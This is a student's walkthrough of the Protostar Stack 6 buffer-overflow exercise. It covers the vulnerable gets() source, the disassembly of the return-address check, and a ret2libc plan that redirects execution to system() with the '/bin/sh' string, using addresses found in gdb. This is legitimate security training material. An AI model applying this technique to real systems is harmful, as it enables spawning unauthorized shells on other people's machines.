
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 6   =-=-=-=-=




1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 
				
		#include <stdlib.h>
		#include <unistd.h>
		#include <stdio.h>
		#include <string.h>

		void getpath()
		{
		  char buffer[64];
		  unsigned int ret;

		  printf("input path please: "); fflush(stdout);

		  gets(buffer);

		  ret = __builtin_return_address(0);

		  if((ret & 0xbf000000) == 0xbf000000) {
		      printf("bzzzt (%p)\n", ret);
		      _exit(1);
		  }

		  printf("got path %s\n", buffer);
		}

		int main(int argc, char **argv)
		{
		  getpath();
		}


3.	Most of the source code should make sence. 
	The '__builtin_return_address(unsigned int level)' returns the return address of the
	current function or of one of its callers. Level specifies the number of stack frames
	to scan for return addresses. Here, level = 0 specifies the return address of 'getpath'
	function. (level=1 signifies the return address of caller function.)

	After analysing the binary, i.e. disassembling the 'getpath()', we see the disassembly -

		.
		.
		.
	1	0x080484aa <getpath+38>:        call   0x8048380 <gets@plt>
	2	0x080484af <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]		
	3	0x080484b2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
	4	0x080484b5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
	5	0x080484b8 <getpath+52>:        and    eax,0xbf000000
	6	0x080484bd <getpath+57>:        cmp    eax,0xbf000000
	7	0x080484c2 <getpath+62>:        jne    0x80484e4 <getpath+96>
	8	0x080484c4 <getpath+64>:        mov    eax,0x80485e4
		
	9	0x080484c9 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
	10	0x080484cc <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
	11	0x080484d0 <getpath+76>:        mov    DWORD PTR [esp],eax
	12	0x080484d3 <getpath+79>:        call   0x80483c0 <printf@plt>
	13	0x080484d8 <getpath+84>:        mov    DWORD PTR [esp],0x1
	14	0x080484df <getpath+91>:        call   0x80483a0 <_exit@plt>
	15	0x080484e4 <getpath+96>:        mov    eax,0x80485f0

		
	Some important instructions -

		2>	mov	eax, DWORD PTR [ebp+0x4]
		=>	This instruction moves the value at memory address [ebp+0x4] (which is
			where the instruction pointer itself lies) into eax. 

		3> 	mov DWORD PTR [ebp-0xc], eax
		=>	moving 4 bytes of eax into the memory address [ebp-0xc], i.e. at 12 bytes
			lower memory address than ebp (or 16 bytes lower memory address than eip).
			(which is where the 'ret' variable stays). So the 'ret' var now stores 
			the return address of the stack frame.

		5>	and	eax, 0xbf000000
		6>	cmp eax, 0xbf000000
		=>	Bitwise AND operation is performed on the value stored in eax register with
			0xbf000000 and then the result is compared again with 0xbf000000.

		7>	jne 0x80484e4 <getpath+96>
		8>  mov eax,0x80485e4	
		.
		.
		.
		14>	call   0x80483a0 <_exit@plt>
		15>	0x080484e4 <getpath+96>:        mov    eax,0x80485f0

		=>	If the above comparison is not true (i.e. the return address is not starting
			with '0xbf') then jump to <getpath+96>, otherwise execute next instruction 
			(i.e. 8 in our case) which leads the flow to exit() and program terminates.



4.	In short what is does is -
	It takes an input string, if the input string goes out of bounds and overwrites the
	return address of the function, it takes the return address of 'getpath' by referencing
	it with 'ebp' ($ebp+0x4), and moves it into 'ret' variable (referenced by $ebp-0xc), 
	then the value at 'ret' variable (the return address) is compared with '0xbf000000' such
	that if it starts with 'bf' then the flow of control changes into 'if-block' where exit()
	lies which terminates the program. 
	So, in a complex way, this challenge restricts us to modify the return address of the
	getpath function with any value starting with '0xbf'. 

	

5.	Now, we look for some place to put our "shellcode" and transfer the code-flow to that 
	place. Lets, look at the starting and ending address of stack segment by using gdb

		(gdb) info proc mapping

		process 22414
		cmdline = '/opt/protostar/bin/stack6'
		cwd = '/opt/protostar/bin'
		exe = '/opt/protostar/bin/stack6'
		Mapped address spaces:

		        Start Addr   End Addr       Size     Offset objfile
		         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
		         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
		        0xb7e96000 0xb7e97000     0x1000          0
		        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
		        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
		        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
		        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
		        0xb7fd9000 0xb7fdc000     0x3000          0
		        0xb7fde000 0xb7fe2000     0x4000          0
		        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
		        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
		        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
		        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
		        0xbffeb000 0xc0000000    0x15000          0           [stack]


	Having a look at the last line of output tells us that we cannot use any address on 
	the stack segment to store our shellcode (no, not even environment variables since they
	also lie on the stack when the program executes) because it lies in the range
	0xbffeb000 - 0xc0000000.


6.	As the hint suggests, we take the 'ret2libc method' for exploitation. In a nutshell, we
	overwrite the return pointer of 'getpath()' with the 'system(const char *command)' found
	in libc (i.e. in /lib/libc-2.11.2.so). The system() takes in argument a command which
	will be then executed by the shell. 



7.	To do this we need to construct a stack frame for system() which will include returning
	to the system()'s address -> adding an address to which code flow will return to after
	system() is executed (which is not of interest to us at this stage) -> argument to 
	the system(), i.e. address of string "/bin/sh" which will be stored in the 
	/lib/libc-2.11.2.so.


8.	To find system()'s address, in debugging mode -
	
		(gdb) print system
		$2 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>


9.	To find address of string "/bin/sh", we use 'strings' utility with -t option to print
	the location of the string (in dec, bin, or hex format)

		$ strings -t x /lib/libc-2.11.2.so | grep "/bin/sh"
		 11f3bf /bin/sh

	Adding the offset "0x11f3bf" to the address where /lib/libc-2.11.2.so will be loaded
	in memory will give the exact address of string "/bin/sh", i.e. in gdb type-

		(gdb) info proc map
		process 2788
		cmdline = '/opt/protostar/bin/stack6'
		cwd = '/opt/protostar/bin'
		exe = '/opt/protostar/bin/stack6'
		Mapped address spaces:

		        Start Addr   End Addr       Size     Offset objfile
		         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
		         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
		        0xb7e96000 0xb7e97000     0x1000          0
		        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
		        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
		        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
		        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
		        0xb7fd9000 0xb7fdc000     0x3000          0
		        0xb7fde000 0xb7fe2000     0x4000          0
		        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
		        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
		        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
		        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
		        0xbffeb000 0xc0000000    0x15000          0           [stack]
		
		(gdb) x/s 0xb7e97000+0x11f3bf
		0xb7fb63bf:      "/bin/sh"


10.	At last writing the exploit. See exploit_stack6.py (for details).		




##	Another method which i tried and which worked too was controlling the return pointer of 
	main() instead of getpath(). Since we have restrictions on overwriting return address of
	getpath(), I overwrote the return pointer of main() (keeping the value of ebp and eip of
	getpath untouched). This worked only once after which it started giving me segmentation
	faults (although it runs the "\xcc" breakpoint instruction successfully, but not any 
	other arbitary code). I'll find more about it.